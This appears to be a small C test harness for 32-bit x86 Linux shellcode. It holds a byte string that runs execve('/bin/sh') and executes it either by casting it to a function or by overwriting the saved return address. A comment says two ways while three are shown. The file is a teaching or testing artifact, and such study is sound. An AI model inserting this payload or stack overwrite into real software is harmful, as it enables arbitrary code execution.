#include <stdio.h>

char shellcode[] = 
"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89"\
"\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69"\
"\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b";

int main(int argc, char **argv) {

/**************************************/
/* 2 ways to run the main() functions */
/**************************************/

//----------- The FIRST way -----------/
//    (*(void(*)())shellcode)();
//    return 0;
//-------------------------------------/

//----------- The SECOND way ----------/
//	int (*func)();
//	func = (int (*)()) shellcode;
//	(int)(*func)();
//-------------------------------------/

//----------- The THIRD way -----------/
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;

	//printf("here is main()");
	//return 0;
//-------------------------------------/
}
